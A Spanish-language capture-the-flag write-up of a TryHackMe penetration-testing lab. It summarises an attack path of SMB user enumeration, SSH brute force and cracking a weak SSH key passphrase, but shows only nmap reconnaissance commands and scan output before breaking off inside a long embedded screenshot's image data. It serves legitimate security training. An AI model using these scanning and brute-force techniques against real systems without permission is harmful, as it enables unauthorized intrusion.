# Basic Penetration Testing

**Autor:** Alexis Sanchez  
**Fecha:** 17 de septiembre de 2026  
**Dificultad:** Fácil  
**Sistema Operativo:** Linux  

---

## Imagen de la Máquina

![Imagen de la Máquina](./images/machine.jpg)

## Introducción

<h3>TL;DR</h3><p>Se obtuvo acceso inicial como <code>jan</code> mediante fuerza bruta SSH, tras enumerar usuarios válidos a través de un share SMB anónimo expuesto. La escalada de privilegios a <code>kay</code> se logró explotando una llave SSH privada con passphrase débil, localizada en un archivo de backup (<code>pass.bak</code>) con permisos mal configurados, obteniendo finalmente la flag y la contraseña en texto plano de <code>kay</code>.</p><p></p><h3>Contexto:</h3><p>TryHackMe Basic Penetration Testing | John Hammond •Aug 19, 2020</p><p>Lista de actividades a seguir</p><ul><li><p>Brute Force</p></li><li><p>Crack Hashing</p></li><li><p>Enumeración de servicios</p></li><li><p>Enumeración de Linux</p></li></ul><p>El objetivo de la maquina es entender el máximo posible</p><p></p>

---

## Reconocimiento Inicial

<pre><code>Nota: la IP de la máquina víctima cambió entre sesiones (la VM se reinició varias veces durante la práctica). Todas las referencias se normalizan a &lt;TARGET_IP&gt;.</code></pre><h3>Escaneo de Puertos</h3><p>Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:</p><pre><code class="language-bash">nmap -Pn -p- --open -sS --min-rate 5000 -vvv -n &lt;TARGET_IP&gt;</code></pre><h3>Escaneo de Servicios</h3><pre><code>nmap -Pn -p -sC &lt;OPEN_TARGET_PORT&gt;</code></pre><h3>Enumeración de Servicios y respondiendo la pregunta "Find the services exposed by the machine"</h3><pre><code>nmap -Pn -p 22,80,139,445,8009,8080 -sC &lt;TARGET_IP&gt;

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-22 19:46 CST

Nmap scan report for &lt;TARGET_IP&gt;

Host is up (0.092s latency).

PORT STATE SERVICE

22/tcp open ssh

| ssh-hostkey:

| 3072 e4:32:2f:ce:b2:ae:12:f3:66:38:8b:2b:21:7b:0d:01 (RSA)

| 256 7b:d9:5c:a8:dd:f8:48:b9:a5:29:9b:29:af:c2:85:e4 (ECDSA)

|_ 256 c2:9b:1b:19:df:f2:82:db:da:4c:19:30:22:20:fa:f1 (ED25519)

80/tcp open http

|_http-title: Site doesn't have a title (text/html).

139/tcp open netbios-ssn

445/tcp open microsoft-ds

8009/tcp open ajp13

| ajp-methods:

|_ Supported methods: GET HEAD POST OPTIONS

8080/tcp open http-proxy

|_http-favicon: Apache Tomcat

|_http-title: Apache Tomcat/9.0.7

Host script results:

| smb2-time:

| date: 2026-09-23T01:46:42

|_ start_date: N/A

| smb2-security-mode:

| 3:1:1:

|_ Message signing enabled but not required

|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)

Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds</code></pre><h3>Primer vistazo web</h3>

### Capturas de Pantalla de la Sección

![Captura de pantalla 2026-09-22 194142.png](data:image/jpeg;base64,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